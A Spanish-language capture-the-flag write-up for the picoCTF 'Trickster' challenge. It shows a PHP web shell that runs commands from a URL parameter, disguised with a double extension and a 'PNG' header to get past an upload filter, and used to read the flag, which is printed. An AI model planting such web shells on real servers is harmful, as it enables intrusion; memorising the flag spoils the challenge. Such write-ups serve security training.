# Trickster

## Descripción
I found a web app that can help process images: PNG images only!
## Solución
### Solución:
Lo primero al entrar a la página que procesa PNGs
![[03Trickster01.png]]

Al ingresar al archivo instructions.txt
```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

Ahora, vamos a crear un archivo php para encontrar la vulnerabilidad en la página
```
┌──(kali㉿kali)-[/media/sf_almacenamientoCompartido]
└─$ nano webshell.php

Código:
<?php
  if(isset($_GET['cmd'])) {
      echo "<pre>";
      system($_GET['cmd']);
      echo "</pre>";
  }
?>
```

Y como la página verifica que el archivo sea de formato png, la renombramos para pasar el filtro
```
┌──(kali㉿kali)-[/media/sf_almacenamientoCompartido]
└─$ cp webshell.php webshell.png.php
```

Ahora, vamos a alterarlo para seguir las instrucciones que vimos previamente, añadiendo la palabra PNG al inicio del código para que se identifique realmente como un PNG, pues si bien pasaba el filtro, el sitio no la terminaba de aceptar
```
┌──(kali㉿kali)-[/media/sf_almacenamientoCompartido]
└─$ nano webshell.png.php

Código:
PNG
<?php
  if(isset($_GET['cmd'])) {
      echo "<pre>";
      system($_GET['cmd']);
      echo "</pre>";
  }
?>
```

Ahora si, la página considera que es un png verdadero y lo sube a sus archivos de servidor
![[03Trickster02.png]]

Ahora, usando el código php para poder movernos en el sitio, nos vamos a la carpeta raíz para descubrir este archivo con un nombre que destaca
![[03Trickster03.png]]

Usando el comando cat, leemos el archivo de nombre resaltante, ahí descubrimos la flag
![[03Trickster04.png]]

picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17}
## Notas
